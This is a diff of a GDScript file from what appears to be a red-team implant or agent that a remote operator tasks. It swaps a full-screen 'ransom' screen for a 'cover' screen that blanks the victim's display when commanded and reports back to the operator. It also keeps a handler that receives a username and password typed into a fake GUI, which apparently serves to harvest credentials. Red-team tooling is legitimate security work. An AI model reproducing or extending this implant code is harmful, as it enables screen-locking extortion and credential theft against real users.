@@ -11,56 +11,53 @@ func _ready():
 	parent = $".".get_parent()
 
 	api = parent.get_node("api")
-	gui = parent.get_node("RansomGUI")
+	gui = parent.get_node("CoverGUI")
 
 func show():
-	# var window_size = OS.get_window_size()
-	# OS.set_window_position(screen_size*0.5 - window_size*0.5) # If not fullscreen
-
-	var screen_size = DisplayServer.screen_get_size(0)
-
-	get_window().set_position(Vector2(0,0))
-
 	get_window().set_title("")
 	var _donotcare = OS.set_thread_name("")
-	get_window().mode = Window.MODE_EXCLUSIVE_FULLSCREEN if (true) else Window.MODE_WINDOWED
-	#OS.window_size = screen_size
 
-	gui.position = screen_size*0.5 - display_size*0.75
+	DisplayServer.window_set_mode(DisplayServer.WINDOW_MODE_MAXIMIZED)
+	DisplayServer.window_set_size(DisplayServer.screen_get_size(0), 0)
 
 	gui.show()
 
 func hide():
 	gui.hide()
-	
+
 	get_window().set_title("")
 	var _donotcare = OS.set_thread_name("")
-	get_window().mode = Window.MODE_EXCLUSIVE_FULLSCREEN if (false) else Window.MODE_WINDOWED
 	get_window().size = Vector2(1,1)
 	gui.position = Vector2(-1,-1)
-	gui.reset()
 
-func _on_tasking_ransom(task):
+func _on_tasking_cover(task):
 
-	if task.has("command") and task.get("command") == "ransom":
-		show()
-		task_id = task.get("id")
-		
+	if task.has("command") and task.get("command") == "cover":
+		var test_json_conv = JSON.new()
+		test_json_conv.parse(task.get("parameters"))
+		var parameters = test_json_conv.get_data()
+		var state = float(parameters.get("state"))
+		var output = "Cover Hidden"
+
+		if state == 0:
+			hide()
+		else:
+			show()
+			output = "Cover Active - Hey, who turned out the lights?"
+
 		api.send_agent_response(
 			api.create_task_response(
 				true,
 				false,
-				task_id,
-				"ransom screen displayed",
-				[], #TODO: any artifact id we can use to track that a ransom screen was shown to the user?
-				[]
+				task.get("id"),
+				output,
 			)
 		)
 	else:
 		print("bad ransom task: ", task)
 	# TODO: agent_response in failure cases
 
-func _on_ransom_gui_verify_username_password(username, password):
+func _on_GUI_verify_username_password(username, password):
 	hide() # TODO: or just keep it up until the redteam member decides it should go away?
 	
 	var realm = "UNKNOWN REALM"
